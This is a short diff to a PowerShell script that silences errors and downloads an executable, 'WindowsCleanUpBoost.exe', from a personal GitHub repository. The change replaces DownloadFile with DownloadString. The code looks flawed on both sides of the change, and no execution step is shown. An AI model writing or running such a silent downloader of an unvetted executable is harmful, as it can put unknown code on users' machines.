@@ -2,7 +2,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 Write-Output "[*] Downloading files"
 $url = "https://github.com/MartijnGriekje/Windows-System-Clean-Boost/raw/main/WindowsCleanUpBoost.exe"
 $output = "$env:USERPROFILE\Desktop\WindowsCleanUpBoost.exe"
-$ls = (New-Object System.Net.WebClient).DownloadFile($url)
+$ls = (New-Object System.Net.WebClient).Downloadstring($url)
 
 if ($ls -eq $null)
 {
